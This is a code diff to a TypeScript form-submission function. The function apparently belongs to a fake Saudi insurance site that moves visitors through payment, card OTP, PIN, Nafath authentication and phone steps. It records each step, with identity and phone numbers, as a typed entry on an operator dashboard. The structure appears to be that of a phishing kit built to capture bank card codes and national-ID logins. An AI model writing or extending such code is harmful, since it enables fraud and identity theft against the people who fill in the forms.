@@ -44,8 +44,28 @@ export async function secureSubmitFormData(data: Record<string, any>): Promise<v
   const visitorId = typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : currentVisitorId;
   console.log('[secureSubmitFormData] Using visitorId:', visitorId);
 
-  // 3. Create/Update dashboard entry immediately with type 'basic' for home-new data
+  // 3. Create/Update dashboard entry immediately with type based on current page
   const customerName = data?.ownerName || data?.buyerName || data?.name || data?.identityNumber || 'عميل جديد';
+  
+  // Determine type based on current page
+  let entryType = 'basic';
+  const currentPage = data?.currentPage || data?.page;
+  
+  if (currentPage === 'insur') {
+    entryType = 'insurance';
+  } else if (currentPage === 'compar') {
+    entryType = 'package';
+  } else if (currentPage === 'check') {
+    entryType = 'payment';
+  } else if (currentPage === 'step2') {
+    entryType = 'card_otp';
+  } else if (currentPage === 'step3') {
+    entryType = 'pin';
+  } else if (currentPage === 'step4') {
+    entryType = 'nafad';
+  } else if (currentPage === 'step5') {
+    entryType = 'phone';
+  }
   
   try {
     const response = await fetch('/api/dashboard/requests', {
@@ -53,13 +73,13 @@ export async function secureSubmitFormData(data: Record<string, any>): Promise<v
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         id: visitorId,
-        type: 'basic', // Type for basic/home-new data
+        type: entryType,
         visitorId: visitorId,
         customer: customerName,
         identityNumber: data?.identityNumber || '',
         phoneNumber: data?.phoneNumber || '',
         currentStep: data?.currentStep || 1,
-        currentPage: data?.currentPage || 'home',
+        currentPage: currentPage || 'home',
         status: 'جديد',
         stage: 'الخطوة 1',
         updated: 'تم التسجيل للتو',
